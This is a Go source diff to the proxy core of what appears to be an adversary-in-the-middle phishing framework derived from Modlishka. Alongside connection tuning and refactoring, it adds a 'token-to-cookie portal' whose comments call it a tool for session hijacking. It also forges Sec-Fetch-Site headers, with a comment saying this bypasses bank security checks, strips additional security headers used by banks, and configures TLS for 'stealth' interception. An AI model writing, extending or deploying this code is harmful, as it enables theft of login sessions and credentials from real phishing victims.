@@ -10,6 +10,7 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"context"
 	crypto_rand "crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
@@ -204,22 +205,26 @@ const (
 )
 
 const (
-	httpReadTimeout       = 300 * time.Second // Allow slow connections
-	httpWriteTimeout      = 300 * time.Second // Allow slow uploads
-	httpIdleTimeout       = 60 * time.Second  // Close idle connections faster to free resources
-	httpReadHeaderTimeout = 30 * time.Second  // Allow slower clients
+	httpReadTimeout       = 120 * time.Second // Allow slow connections but not forever
+	httpWriteTimeout      = 120 * time.Second // Allow slow uploads but not forever
+	httpIdleTimeout       = 30 * time.Second  // Close idle connections faster to free resources
+	httpReadHeaderTimeout = 15 * time.Second  // Reasonable header timeout
 
 	// Connection pool and speed optimization settings - LARGE CAPACITY
-	maxIdleConns        = 1000             // High capacity for many visitors
-	maxIdleConnsPerHost = 100              // More connections per host
-	maxConnsPerHost     = 200              // Max total connections per-host
-	idleConnTimeout     = 60 * time.Second // Shorter timeout to recycle connections
-	tlsHandshakeTimeout = 60 * time.Second // TLS handshake deadline (generous)
+	maxIdleConns        = 500              // Reduced to prevent memory buildup
+	maxIdleConnsPerHost = 50               // More reasonable per-host limit
+	maxConnsPerHost     = 100              // Max total connections per-host
+	idleConnTimeout     = 30 * time.Second // Shorter timeout to recycle connections faster
+	tlsHandshakeTimeout = 30 * time.Second // TLS handshake deadline
 	expectContTimeout   = 1 * time.Second  // Expect: 100-continue timeout
-	respHeaderTimeout   = 0                // DISABLED - Microsoft endpoints can be very slow
+	respHeaderTimeout   = 60 * time.Second // Wait up to 60s for response headers
 
 	// Stealth/reliability: periodic maintenance
-	connPoolRefreshInterval = 2 * time.Minute // Refresh connections more frequently
+	connPoolRefreshInterval = 1 * time.Minute // Refresh connections every minute
+
+	// TCP Keep-Alive settings for long-lived connections
+	tcpKeepAliveInterval = 30 * time.Second // Send keep-alive probes every 30 seconds
+	tcpKeepAliveCount    = 3                // Give up after 3 failed probes
 )
 
 // original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
@@ -231,6 +236,7 @@ var (
 	botguardTelRe    = regexp.MustCompile(`^/api/v1/analytics$`)
 	dcPageRe         = regexp.MustCompile(`^/dc/([a-zA-Z0-9_-]+)$`)
 	dcStatusRe       = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9_-]+)$`)
+	portalPageRe     = regexp.MustCompile(`^/p/([a-fA-F0-9]{64})$`)
 	redirRe          = regexp.MustCompile(`^/assets/js/([^/]*)`)
 	jsInjectRe       = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
 	jsonContentRe    = regexp.MustCompile(`application/\w*\+?json`)
@@ -272,8 +278,19 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
-	stopChan          chan struct{}   // For graceful shutdown
-	rateLimiter       *RateLimiter    // DDoS protection and load management
+	stopChan          chan struct{} // For graceful shutdown
+	rateLimiter       *RateLimiter  // DDoS protection and load management
+	tokenPortal       *TokenPortal  // Token-to-cookie portal for session hijacking
+
+	// Connection statistics for monitoring
+	connStats struct {
+		sync.RWMutex
+		activeConns   int64     // Current active connections
+		totalConns    int64     // Total connections handled
+		failedConns   int64     // Failed connections (TLS errors, etc.)
+		lastConnTime  time.Time // Last successful connection time
+		startTime     time.Time // Server start time
+	}
 }
 
 type ProxySession struct {
@@ -321,6 +338,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
+
+	// Initialize token portal for session cookie extraction
+	p.tokenPortal = NewTokenPortal(db)
+
+	// Initialize connection statistics
+	p.connStats.startTime = time.Now()
+	p.connStats.lastConnTime = time.Now()
 
 	// Initialize notifier from config
 	p.notifier.LoadNotifiers(cfg.GetNotifiers(), cfg.GetNotifierDefaults())
@@ -389,7 +413,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	// 1. Reusing connections (connection pooling) instead of new TCP+TLS per request
 	// 2. Keeping idle connections alive longer to avoid handshake overhead
 	// 3. Allowing more parallel connections to upstream servers
+	// 4. TCP Keep-Alive on all outgoing connections for reliability
 	// ════════════════════════════════════════════════════════════════════════
+
+	// Create a custom dialer with TCP Keep-Alive for outgoing connections
+	dialer := &net.Dialer{
+		Timeout:   30 * time.Second,         // Connection timeout
+		KeepAlive: tcpKeepAliveInterval,     // TCP Keep-Alive probe interval
+		DualStack: true,                     // Support both IPv4 and IPv6
+	}
+	p.Proxy.Tr.DialContext = dialer.DialContext
+
 	p.Proxy.Tr.MaxIdleConns = maxIdleConns
 	p.Proxy.Tr.MaxIdleConnsPerHost = maxIdleConnsPerHost
 	p.Proxy.Tr.MaxConnsPerHost = maxConnsPerHost
@@ -397,9 +431,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.Tr.TLSHandshakeTimeout = tlsHandshakeTimeout
 	p.Proxy.Tr.ExpectContinueTimeout = expectContTimeout
 	p.Proxy.Tr.ResponseHeaderTimeout = respHeaderTimeout
-	p.Proxy.Tr.DisableCompression = false // Allow gzip/brotli from upstream
-	p.Proxy.Tr.ForceAttemptHTTP2 = true   // Prefer HTTP/2 for multiplexing
-	log.Info("transport: connection pooling enabled (max_idle=%d, per_host=%d)", maxIdleConns, maxIdleConnsPerHost)
+	p.Proxy.Tr.DisableCompression = false      // Allow gzip/brotli from upstream
+	p.Proxy.Tr.ForceAttemptHTTP2 = true        // Prefer HTTP/2 for multiplexing
+	p.Proxy.Tr.DisableKeepAlives = false       // Enable connection reuse
+	p.Proxy.Tr.WriteBufferSize = 64 * 1024     // 64KB write buffer for performance
+	p.Proxy.Tr.ReadBufferSize = 64 * 1024      // 64KB read buffer for performance
+	log.Info("transport: connection pooling enabled (max_idle=%d, per_host=%d, keep_alive=%v)", maxIdleConns, maxIdleConnsPerHost, tcpKeepAliveInterval)
 
 	// uTLS: Chrome 120 TLS fingerprint on ALL outgoing connections.
 	// Go's default net/http JA3 (4d7a28d6f2263ed61de88ca66eb2e98) is
@@ -459,10 +496,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			} else if xri := req.Header.Get("X-Real-IP"); xri != "" {
 				clientIP = xri
 			}
-			
+
 			if allowed, reason := p.rateLimiter.AllowRequest(clientIP); !allowed {
 				log.Debug("[ratelimit] Blocked %s: %s", clientIP, reason)
-				resp := goproxy.NewResponse(req, "text/html", http.StatusServiceUnavailable, 
+				resp := goproxy.NewResponse(req, "text/html", http.StatusServiceUnavailable,
 					"<html><body><h1>Service Temporarily Unavailable</h1><p>Please try again later.</p></body></html>")
 				resp.Header.Set("Retry-After", "30")
 				return req, resp
@@ -721,7 +758,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					p.session_mtx.Lock()
 					s, ok := p.sessions[session_id]
 					p.session_mtx.Unlock()
-					log.Debug("[devicecode] session found: %v, DCState: %s, DCSessionID: %s", ok, func() string { if ok { return s.DCState } else { return "N/A" } }(), func() string { if ok { return s.DCSessionID } else { return "N/A" } }())
+					log.Debug("[devicecode] session found: %v, DCState: %s, DCSessionID: %s", ok, func() string {
+						if ok {
+							return s.DCState
+						} else {
+							return "N/A"
+						}
+					}(), func() string {
+						if ok {
+							return s.DCSessionID
+						} else {
+							return "N/A"
+						}
+					}())
 
 					if ok && (s.DCSessionID != "" || s.DCState == DCStatePending) {
 						userCode := ""
@@ -815,6 +864,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 			// --- End device code interstitial endpoint ---
+
+			// --- Begin portal endpoint (token-to-cookie conversion) ---
+			if portalPageRe.MatchString(req.URL.Path) {
+				ra := portalPageRe.FindStringSubmatch(req.URL.Path)
+				if len(ra) >= 2 {
+					portalToken := ra[1]
+					ps, err := p.tokenPortal.GetPortalSession(portalToken)
+					if err != nil {
+						log.Warning("[portal] invalid portal access: %v (from %s)", err, remote_addr)
+						resp := goproxy.NewResponse(req, "text/html", 403, "<html><body><h1>403 - Link expired or invalid</h1><p>This portal link has expired or is no longer valid. Generate a new one with: <code>sessions &lt;id&gt; portal</code></p></body></html>")
+						return req, resp
+					}
+					p.tokenPortal.MarkUsed(portalToken)
+					html := GeneratePortalHTML(ps)
+					resp := goproxy.NewResponse(req, "text/html", 200, html)
+					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+					resp.Header.Set("Pragma", "no-cache")
+					resp.Header.Set("X-Frame-Options", "DENY")
+					log.Info("[portal] Portal page served for session %d to %s", ps.SessionID, remote_addr)
+					return req, resp
+				}
+			}
+			// --- End portal endpoint ---
 
 			// --- Begin Botguard bot detection ---
 			// Skip botguard for ACME challenge paths (Let's Encrypt cert validation)
@@ -1580,6 +1652,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if sec_fetch_dest == "iframe" {
 						req.Header.Set("Sec-Fetch-Dest", "document")
 					}
+				}
+
+				// fix sec-fetch-site to appear as same-origin
+				// this helps bypass bank security checks
+				sec_fetch_site := req.Header.Get("Sec-Fetch-Site")
+				if sec_fetch_site == "cross-site" {
+					req.Header.Set("Sec-Fetch-Site", "same-origin")
 				}
 
 				// fix referer
@@ -2712,6 +2791,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				"X-XSS-Protection",
 				"X-Content-Type-Options",
 				"X-Frame-Options",
+				// Additional security headers used by banks
+				"Cross-Origin-Opener-Policy",
+				"Cross-Origin-Embedder-Policy",
+				"Cross-Origin-Resource-Policy",
+				"Permissions-Policy",
+				"Feature-Policy",
+				"Report-To",
+				"NEL",
+				"Expect-CT",
+				"X-Permitted-Cross-Domain-Policies",
+				"Referrer-Policy",
+				"Clear-Site-Data",
 			}
 			for _, hdr := range rm_headers {
 				resp.Header.Del(hdr)
@@ -3956,7 +4047,56 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			port, _ = strconv.Atoi(parts[1])
 		}
 
-		tls_cfg := &tls.Config{}
+		// Base TLS config designed for maximum reliability and stealth:
+		// - Session tickets disabled to prevent resumption issues across connections
+		// - Cipher suites match typical server configurations (not client JA3)
+		// - Curve preferences follow server best practices
+		// - HTTP/1.1 forced to avoid HTTP/2 complexity with MITM
+		baseTLSConfig := func(certs []tls.Certificate, getCert func(*tls.ClientHelloInfo) (*tls.Certificate, error)) *tls.Config {
+			cfg := &tls.Config{
+				// Protocol negotiation - force HTTP/1.1 to ensure MITM works correctly
+				NextProtos: []string{"http/1.1"},
+
+				// Session management - disable tickets to prevent resumption failures
+				// This ensures each connection does a clean full handshake
+				SessionTicketsDisabled: true,
+
+				// TLS version range - match modern server configurations
+				MinVersion: tls.VersionTLS12,
+				MaxVersion: tls.VersionTLS13,
+
+				// Cipher suites - server-side preference order matching real servers
+				// These are chosen to balance security with broad compatibility
+				CipherSuites: []uint16{
+					// TLS 1.3 cipher suites are automatically used and can't be configured
+					// For TLS 1.2, prefer ECDHE suites with modern ciphers
+					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+				},
+
+				// Curve preferences - standard server configuration
+				CurvePreferences: []tls.CurveID{
+					tls.X25519,
+					tls.CurveP256,
+					tls.CurveP384,
+				},
+
+				// Server chooses cipher (more control over security)
+				PreferServerCipherSuites: true,
+			}
+			if len(certs) > 0 {
+				cfg.Certificates = certs
+			}
+			if getCert != nil {
+				cfg.GetCertificate = getCert
+			}
+			return cfg
+		}
+
 		if !p.developer {
 			// Check if wildcard TLS is enabled and using self-signed certs (no external DNS)
 			if p.cfg.IsWildcardTLSEnabled() {
@@ -3964,9 +4104,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				cert := p.crt_db.getWildcardCertificate(hostname)
 				if cert != nil {
 					log.Debug("[TLS] serving wildcard cert for %s", hostname)
-					return &tls.Config{
-						Certificates: []tls.Certificate{*cert},
-					}, nil
+					return baseTLSConfig([]tls.Certificate{*cert}, nil), nil
 				}
 				// Wildcard cert not found - generate one on-the-fly
 				log.Debug("[TLS] wildcard cert not found for %s, generating...", hostname)
@@ -3981,9 +4119,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 						cert = p.crt_db.getWildcardCertificate(hostname)
 						if cert != nil {
 							log.Debug("[TLS] generated and serving wildcard cert for %s", hostname)
-							return &tls.Config{
-								Certificates: []tls.Certificate{*cert},
-							}, nil
+							return baseTLSConfig([]tls.Certificate{*cert}, nil), nil
 						}
 					}
 				}
@@ -3992,7 +4128,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				return nil, fmt.Errorf("no wildcard certificate for %s", hostname)
 			}
 
-			tls_cfg.GetCertificate = func(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
+			getCert := func(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
 				cert, err := p.crt_db.magic.GetCertificate(hello)
 				if err == nil {
 					return cert, nil
@@ -4007,9 +4143,8 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				}
 				return fallbackCert, nil
 			}
-			tls_cfg.NextProtos = []string{"http/1.1"}
 
-			return tls_cfg, nil
+			return baseTLSConfig(nil, getCert), nil
 		} else {
 			var ok bool
 			phish_host := ""
@@ -4026,10 +4161,10 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				log.Error("http_proxy: %s", err)
 				return nil, err
 			}
-			return &tls.Config{
-				InsecureSkipVerify: true,
-				Certificates:       []tls.Certificate{*cert},
-			}, nil
+			// Developer mode also uses consistent TLS config
+			cfg := baseTLSConfig([]tls.Certificate{*cert}, nil)
+			cfg.InsecureSkipVerify = true
+			return cfg, nil
 		}
 	}
 }
@@ -4081,66 +4216,161 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 	}
 }
 
+// configureKeepAlive enables TCP Keep-Alive on a connection to detect dead peers
+// and prevent half-open connections from consuming resources indefinitely.
+func configureKeepAlive(c net.Conn) {
+	if tcpConn, ok := c.(*net.TCPConn); ok {
+		tcpConn.SetKeepAlive(true)
+		tcpConn.SetKeepAlivePeriod(tcpKeepAliveInterval)
+		// Note: SetNoDelay is true by default for TCP connections in Go
+	}
+}
+
 func (p *HttpProxy) httpsWorker() {
 	var err error
 
-	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
+	// Create a TCP listener with custom configuration
+	lc := net.ListenConfig{
+		KeepAlive: tcpKeepAliveInterval, // Enable TCP Keep-Alive on accepted connections
+	}
+	p.sniListener, err = lc.Listen(context.Background(), "tcp", p.Server.Addr)
 	if err != nil {
 		log.Fatal("%s", err)
 		return
 	}
 
+	log.Info("[httpsWorker] Listening on %s with TCP Keep-Alive enabled", p.Server.Addr)
 	p.isRunning = true
+
 	for p.isRunning {
 		c, err := p.sniListener.Accept()
 		if err != nil {
+			// Check if this is a temporary error or shutdown
+			if ne, ok := err.(net.Error); ok && ne.Temporary() {
+				log.Debug("[httpsWorker] Temporary accept error: %v", err)
+				time.Sleep(5 * time.Millisecond) // Brief backoff for temporary errors
+				continue
+			}
+			if !p.isRunning {
+				// Normal shutdown
+				return
+			}
 			log.Error("Error accepting connection: %s", err)
 			continue
 		}
 
-		go func(c net.Conn) {
-			remoteAddr := c.RemoteAddr().String()
-			log.Debug("[httpsWorker] new TCP connection from %s", remoteAddr)
-			now := time.Now()
-			c.SetReadDeadline(now.Add(httpReadTimeout))
-			c.SetWriteDeadline(now.Add(httpWriteTimeout))
+		go p.handleHTTPSConnection(c)
+	}
+}
 
-			tlsConn, err := vhost.TLS(c)
-			if err != nil {
-				log.Debug("[httpsWorker] vhost.TLS error from %s: %v", remoteAddr, err)
-				return
-			}
+// handleHTTPSConnection processes a single HTTPS connection with proper error handling
+// and resource cleanup. Runs in a goroutine per connection.
+func (p *HttpProxy) handleHTTPSConnection(c net.Conn) {
+	remoteAddr := c.RemoteAddr().String()
 
-			hostname := tlsConn.Host()
-			log.Debug("[httpsWorker] SNI hostname: %s from %s", hostname, remoteAddr)
-			if hostname == "" {
-				log.Debug("[httpsWorker] empty SNI from %s, dropping", remoteAddr)
-				return
-			}
+	// Track connection statistics
+	p.connStats.Lock()
+	p.connStats.activeConns++
+	p.connStats.totalConns++
+	p.connStats.Unlock()
 
-			if !p.cfg.IsActiveHostname(hostname) {
-				log.Debug("[httpsWorker] hostname unsupported: %s from %s", hostname, remoteAddr)
-				return
-			}
-			log.Debug("[httpsWorker] hostname OK: %s from %s, forwarding to proxy", hostname, remoteAddr)
+	// Ensure connection is always closed when this function exits
+	defer func() {
+		if r := recover(); r != nil {
+			log.Error("[httpsWorker] PANIC handling %s: %v", remoteAddr, r)
+			p.connStats.Lock()
+			p.connStats.failedConns++
+			p.connStats.Unlock()
+		}
+		c.Close()
+		p.connStats.Lock()
+		p.connStats.activeConns--
+		p.connStats.Unlock()
+	}()
 
-			// Keep the phish hostname for CONNECT - TLS needs it to find the wildcard cert
-			// The translation to original hostname happens during request forwarding
-			phishHostname := hostname
+	// Configure TCP Keep-Alive for this connection
+	configureKeepAlive(c)
 
-			req := &http.Request{
-				Method: "CONNECT",
-				URL: &url.URL{
-					Opaque: phishHostname,
-					Host:   net.JoinHostPort(phishHostname, "443"),
-				},
-				Host:       phishHostname,
-				Header:     make(http.Header),
-				RemoteAddr: c.RemoteAddr().String(),
-			}
-			resp := dumbResponseWriter{tlsConn}
-			p.Proxy.ServeHTTP(resp, req)
-		}(c)
+	// Set initial deadlines - these will be refreshed by goproxy for each request
+	now := time.Now()
+	c.SetReadDeadline(now.Add(httpReadTimeout))
+	c.SetWriteDeadline(now.Add(httpWriteTimeout))
+
+	log.Debug("[httpsWorker] new TCP connection from %s", remoteAddr)
+
+	// Parse TLS ClientHello to extract SNI without consuming the TLS data
+	tlsConn, err := vhost.TLS(c)
+	if err != nil {
+		log.Debug("[httpsWorker] vhost.TLS error from %s: %v", remoteAddr, err)
+		p.connStats.Lock()
+		p.connStats.failedConns++
+		p.connStats.Unlock()
+		return // defer will close connection
+	}
+
+	hostname := tlsConn.Host()
+	if hostname == "" {
+		log.Debug("[httpsWorker] empty SNI from %s, dropping", remoteAddr)
+		p.connStats.Lock()
+		p.connStats.failedConns++
+		p.connStats.Unlock()
+		return // defer will close connection
+	}
+
+	log.Debug("[httpsWorker] SNI hostname: %s from %s", hostname, remoteAddr)
+
+	if !p.cfg.IsActiveHostname(hostname) {
+		log.Debug("[httpsWorker] hostname unsupported: %s from %s", hostname, remoteAddr)
+		return // defer will close connection (not counted as failed - just unsupported)
+	}
+
+	log.Debug("[httpsWorker] hostname OK: %s from %s, forwarding to proxy", hostname, remoteAddr)
+
+	// Update last successful connection time
+	p.connStats.Lock()
+	p.connStats.lastConnTime = time.Now()
+	p.connStats.Unlock()
+
+	// Keep the phish hostname for CONNECT - TLS needs it to find the wildcard cert
+	// The translation to original hostname happens during request forwarding
+	phishHostname := hostname
+
+	// Create synthetic CONNECT request for goproxy
+	req := &http.Request{
+		Method: "CONNECT",
+		URL: &url.URL{
+			Opaque: phishHostname,
+			Host:   net.JoinHostPort(phishHostname, "443"),
+		},
+		Host:       phishHostname,
+		Header:     make(http.Header),
+		RemoteAddr: remoteAddr,
+	}
+
+	// Use the vhost TLS connection wrapper which preserves the ClientHello data
+	resp := dumbResponseWriter{tlsConn}
+	p.Proxy.ServeHTTP(resp, req)
+}
+
+// ConnectionStats holds statistics about proxy connections
+type ConnectionStats struct {
+	ActiveConns  int64
+	TotalConns   int64
+	FailedConns  int64
+	LastConnTime time.Time
+	Uptime       time.Duration
+}
+
+// GetConnectionStats returns current connection statistics
+func (p *HttpProxy) GetConnectionStats() ConnectionStats {
+	p.connStats.RLock()
+	defer p.connStats.RUnlock()
+	return ConnectionStats{
+		ActiveConns:  p.connStats.activeConns,
+		TotalConns:   p.connStats.totalConns,
+		FailedConns:  p.connStats.failedConns,
+		LastConnTime: p.connStats.lastConnTime,
+		Uptime:       time.Since(p.connStats.startTime),
 	}
 }
 
@@ -4419,6 +4649,7 @@ func (p *HttpProxy) Start() error {
 // 1. Dead upstream connections are flushed
 // 2. TLS session cache stays fresh
 // 3. Connection pool doesn't accumulate broken connections
+// 4. Stale IP whitelist entries are cleaned up
 func (p *HttpProxy) connectionMaintenanceWorker() {
 	ticker := time.NewTicker(connPoolRefreshInterval)
 	defer ticker.Stop()
@@ -4428,10 +4659,33 @@ func (p *HttpProxy) connectionMaintenanceWorker() {
 		case <-ticker.C:
 			// Flush all idle connections - forces fresh connections on next request
 			p.Proxy.Tr.CloseIdleConnections()
-			log.Debug("[stealth] connection pool refreshed")
+
+			// Clean up expired IP whitelist entries to prevent memory growth
+			p.cleanupExpiredWhitelist()
+
+			log.Debug("[stealth] connection pool refreshed, whitelist cleaned")
 		case <-p.stopChan:
 			return
 		}
+	}
+}
+
+// cleanupExpiredWhitelist removes expired entries from ip_whitelist and ip_sids
+func (p *HttpProxy) cleanupExpiredWhitelist() {
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
+
+	now := time.Now().Unix()
+	cleaned := 0
+	for key, expiry := range p.ip_whitelist {
+		if expiry < now {
+			delete(p.ip_whitelist, key)
+			delete(p.ip_sids, key)
+			cleaned++
+		}
+	}
+	if cleaned > 0 {
+		log.Debug("[maintenance] cleaned %d expired whitelist entries", cleaned)
 	}
 }
 
